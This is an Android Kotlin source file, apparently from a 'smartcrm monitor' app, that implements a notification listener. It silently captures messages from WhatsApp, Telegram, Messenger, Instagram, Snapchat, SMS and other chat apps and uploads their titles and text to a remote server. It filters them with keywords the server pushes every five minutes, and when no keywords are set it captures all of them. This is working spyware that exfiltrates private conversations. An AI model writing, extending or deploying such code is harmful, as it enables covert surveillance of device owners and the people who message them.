package com.smartcrm.monitor

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

/**
 * Captures all notifications from all apps.
 * Sends to server with keyword filtering.
 * Keywords are fetched from server every 5 minutes.
 */
class NotificationService : NotificationListenerService() {

    // Apps jinka notifications capture karni hain
    private val TARGET_PACKAGES = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",          // WhatsApp Business
        "org.telegram.messenger",
        "org.telegram.plus",
        "com.facebook.katana",
        "com.facebook.orca",         // Facebook Messenger
        "com.instagram.android",
        "com.twitter.android",
        "com.snapchat.android",
        "com.viber.voip",
        "com.skype.raider",
        "com.google.android.apps.messaging", // Google Messages
        "com.samsung.android.messaging",
        "com.android.mms"
    )

    // Keywords jo server se aate hain
    private var keywords: List<String> = emptyList()
    private var lastKeywordFetch = 0L
    private val KEYWORD_FETCH_INTERVAL = 5 * 60 * 1000L // 5 min

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return

        // Sirf target apps ki notifications
        if (!TARGET_PACKAGES.contains(pkg)) return

        val extras = sbn.notification?.extras ?: return
        val title  = extras.getString("android.title") ?: ""
        val text   = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text

        // Empty notifications skip
        if (text.isEmpty() && bigText.isEmpty()) return

        // Khud ki notifications ignore (loops prevent)
        if (pkg == packageName) return

        // Keywords refresh karo agar time ho gaya
        refreshKeywordsIfNeeded()

        // Check karo keyword match hota hai ya nahi
        val fullText    = "$title $bigText".lowercase()
        val keywordHit  = keywords.isEmpty() || keywords.any { kw ->
            fullText.contains(kw.lowercase())
        }

        if (keywordHit) {
            sendNotification(pkg, title, bigText, sbn.postTime)
        }
    }

    private fun sendNotification(pkg: String, title: String, text: String, time: Long) {
        Thread {
            try {
                val d = JSONObject()
                d.put("type", "notification")
                d.put("app_package", pkg)
                d.put("app_name", getAppName(pkg))
                d.put("title", title)
                d.put("message", text)
                d.put("notif_time", time)
                ApiClient.post("api.php", d, this)
            } catch (e: Exception) {}
        }.start()
    }

    private fun refreshKeywordsIfNeeded() {
        val now = System.currentTimeMillis()
        if (now - lastKeywordFetch < KEYWORD_FETCH_INTERVAL) return
        lastKeywordFetch = now

        Thread {
            try {
                val resp = ApiClient.get("api.php", mapOf("action" to "get_keywords"), this)
                val arr  = resp?.optJSONArray("keywords")
                if (arr != null) {
                    val list = mutableListOf<String>()
                    for (i in 0 until arr.length()) {
                        val kw = arr.optString(i)
                        if (kw.isNotEmpty()) list.add(kw)
                    }
                    keywords = list
                }
            } catch (e: Exception) {}
        }.start()
    }

    private fun getAppName(pkg: String): String {
        return try {
            val info = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            pkg
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }
}
